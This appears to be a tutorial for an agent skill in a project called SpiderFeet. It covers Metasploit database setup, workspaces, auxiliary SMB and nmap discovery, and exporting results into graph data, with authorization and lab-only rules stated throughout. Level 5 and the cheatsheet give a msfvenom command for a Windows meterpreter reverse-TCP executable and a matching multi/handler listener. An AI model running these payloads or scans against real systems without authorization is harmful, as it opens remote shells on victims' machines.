# Metasploit Framework Zero to Hero — Discovery, DB, Payloads, Nuggets

From install through a **safe lab** workflow: database → workspace → auxiliary discovery → optional `msfvenom` + `multi/handler` → export → SpiderFeet nuggets.

Skill: `.cursor/skills/metasploit_framework/SKILL.md`  
CLI flags: `Metasploit-Framework-CLI-Options.md`

**Package referenced here:** nightly Windows tree **metasploit-framework 6.5.2-20260809060523-1rapid7** under `.tools/metasploit/framework/`.

---

## What Metasploit is (and is not)

Metasploit Framework is a **modular Ruby pentest platform**:

- **`msfconsole`** — primary interface for modules, workspaces, sessions  
- **`msfvenom`** — standalone payload generation  
- **`msfdb`** — PostgreSQL database and optional REST webservice  

It is **not** a replacement for:

| Job | Prefer |
|-----|--------|
| Mass port scan | **naabu** / **nmap** |
| HTTP live + tech | **httpx** |
| Template CVE scanning | **nuclei** |
| Fast service fingerprint | **nerva** |

Use MSF when you need **auxiliary modules**, **workspace-backed correlation**, or **lab handler/payload** validation that feeds SpiderFeet graphs.

---

## Level 0 — Install and runtime reality

### Preferred installs

- [Nightly installers](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html) (complete Windows MSI / Linux / macOS)  
- Kali `metasploit-framework` package  

Verify:

```bash
msfconsole -v
msfvenom -h
msfdb status
```

### SpiderFeet Windows tree (2026-08-10)

Admin **extract** of the nightly package into `.tools/metasploit/framework/` left gems unresolved:

- Live `msfconsole` / `msfvenom` / `msfdb` → **`Bundler::GemNotFound`**  
- Full MSI install → **error 1603**  

Until a working install exists, treat live exercise as blocked and use **reconstructed OptionParser help** in the CLI-Options doc as flag truth. Do not invent flags or pretend empty output is a clean miss.

---

## Level 1 — Initialize the database

```bash
msfdb init --use-defaults
msfdb status
```

Start console and confirm:

```bash
msfconsole -q
```

```text
msf6 > db_status
```

Expect a connected database before workspace workflows. Intentional offline console: `msfconsole -n`.

---

## Level 2 — Workspace

```text
msf6 > workspace -a lab_msf
msf6 > workspace lab_msf
msf6 > workspace
```

One workspace per engagement or corpus scenario. Keep discovery out of `default` when you need clean exports.

---

## Level 3 — Auxiliary host discovery

```text
msf6 > search type:auxiliary scanner smb
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > info
msf6 > show options
msf6 > set RHOSTS 192.168.56.0/24
msf6 > run
msf6 > hosts
msf6 > services
```

Rules:

1. Read `info` / advanced / evasion before running.  
2. Stay in `auxiliary/scanner/*` or `auxiliary/gather/*` unless exploit scope is explicit.  
3. After each run, inspect DB tables — not only the scrolling console.

Automation equivalent:

```bash
msfconsole -q -x "workspace lab_msf; use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.56.0/24; run; hosts; services"
```

Or `-r discover.rc` with the same commands line-by-line.

---

## Level 4 — Service / version enrichment

Options that keep data in the workspace:

```text
msf6 > db_nmap -sV -T4 192.168.56.10
msf6 > services
```

Or a second auxiliary module aimed at open ports discovered in Level 3. Pair with external **nmap**/**naabu**/**httpx** when you need breadth; import or correlate rather than re-implementing mass scan poorly inside MSF.

---

## Level 5 — Optional lab payload + handler

Authorized lab VMs only.

Generate:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe -o lab_payload.exe
```

Listen:

```text
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.56.1
msf6 > set LPORT 4444
msf6 > run -j
msf6 > sessions -l
```

Payload name and LHOST/LPORT must match. Treat the binary as malware-like; do not use this path for general OSINT corpus scenarios.

---

## Level 6 — Export and SpiderFeet nuggets

```text
msf6 > db_export -f xml /tmp/lab_msf_export.xml
msf6 > hosts
msf6 > services
msf6 > vulns
```

Map (see skill `references/nugget-mapping.md`):

| Evidence | Nuggets |
|----------|---------|
| Host IPs | `IP_ADDRESS` / `INTERNAL_IP_ADDRESS` via `classify_ip` |
| Hostnames | `INTERNET_NAME` |
| Ports | `TCP_PORT_OPEN` / `UDP_PORT_OPEN` |
| Banners / OS | `TCP_PORT_OPEN_BANNER`, `OPERATING_SYSTEM` |
| Vulns | `VULNERABILITY_CVE_*` / `VULNERABILITY_GENERAL` |

Emit `nodes[]` / `edges[]` with `contains` / `has` / `runs` / `affected_by`. Prefer DB export as the **structured** artifact; derive human text from it. Use TextFSM only when console-only fields never hit the DB.

---

## Level 7 — Strategies when things go wrong

| Symptom | Tactic |
|---------|--------|
| `Bundler::GemNotFound` | Install blocker — fix package/gems; document error scenario |
| `db_status` disconnected | `msfdb start` / re-`init` |
| Empty `hosts` | Check reachability, `RHOSTS` syntax, module fit, DB enabled |
| `check` fails | Retune options; try related aux; do not jump to `exploit` |
| Staged payload fails | Stageless payload + matching handler |
| Need CVE breadth | Switch to **nuclei**; keep MSF for module-specific follow-up |

Search tips: `type:auxiliary`, protocol keywords, CVE ids, `name:` fragments. Prefer modules with docs under `documentation/modules/**`.

---

## Safety defaults

- Written authorization for every target.  
- Auxiliary / discovery first.  
- Exploitation and AV-evasion modules only when explicitly approved.  
- Lab-only payloads and handlers.  
- Workspace isolation per engagement.  
- Do not invent CLI flags beyond reconstructed/live captures in the CLI-Options doc.

---

## Quick command cheatsheet

```bash
# DB
msfdb init --use-defaults
msfdb status

# Console automation
msfconsole -q -r script.rc
msfconsole -q -x "workspace lab; db_status; hosts"

# Payload (lab)
msfvenom -l payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe -o p.exe
```

```text
# Inside msfconsole
workspace -a lab
search type:auxiliary scanner http
use auxiliary/scanner/...
info
show options
set RHOSTS ...
run
hosts
services
db_export -f xml /tmp/out.xml
```
